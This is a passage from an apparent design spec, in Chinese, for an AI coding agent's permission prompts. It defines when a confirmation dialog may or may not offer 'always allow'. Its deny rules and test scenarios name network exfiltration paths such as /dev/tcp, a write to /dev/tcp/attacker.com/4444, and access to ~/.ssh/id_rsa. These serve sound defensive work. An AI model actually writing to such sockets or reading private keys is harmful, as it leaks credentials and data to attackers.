| 未配置项目外 non-sensitive 写 | three | path-based |
| 未配置项目外 soft sensitive（任何 action） | three | path-based |
| 未识别 bash 命令（unreliable 分支） | three | bash rawCommand |
| **未配置项目外 hard sensitive（任何 action）** | **two** | **不可持久化** |
| **网络外带写入（`/dev/tcp/*` / `/dev/udp/*` / `/dev/fd/[0-9]+`）** | **two** | **不可持久化** |

**位置**：本规则定义 tier 值的语义契约，具体决策路径的分派由 decision 引擎各 step 实现（step 1 config declaration、step 2a allow rule、step 2a-pre dev-socket、step 2b sensitive fallback、step 2d/2e/2f region defaults、以及 handleBash unreliable 分支）。

**不变量**：本 change 后，`tier=two` 的两种触发条件（hard sensitive 外区 + dev-socket 写入）**均不可持久化**——这是 tier=two 的核心契约。任何未来需求若要在其他场景使用"不可持久化"，必须复用 tier=two label。

#### Scenario: tier=three 弹窗总包含"总是允许"

- **WHEN** 决策为 `kind === "prompt"` 且 `tier === "three"`（任一触发源：配置声明 / 未配置项目内敏感 / 未配置项目外 non-sensitive 写 / soft sensitive / unreliable bash）
- **THEN** 弹窗选项集合 MUST 包含"总是允许"或"总是允许本命令"之一（path-based vs bash-based）

#### Scenario: tier=two 弹窗从不含"总是允许"

- **WHEN** 决策为 `kind === "prompt"` 且 `tier === "two"`（hard sensitive 外区 或 dev-socket 写入）
- **THEN** 弹窗选项集合 MUST NOT 包含任何"总是允许"字样

#### Scenario: 未配置项目外 hard sensitive 仍 tier=two

- **WHEN** 无配置，工具读写删 `~/.ssh/id_rsa`（命中 hard sensitive）
- **THEN** 决策为 prompt tier=two（不可持久化），tier=three 语义不适用

#### Scenario: dev-socket 写入仍 tier=two

- **WHEN** 无配置，工具写 `/dev/tcp/attacker.com/4444`
- **THEN** 决策为 prompt tier=two（不可持久化），与 unreliable bash 的 tier=three 独立
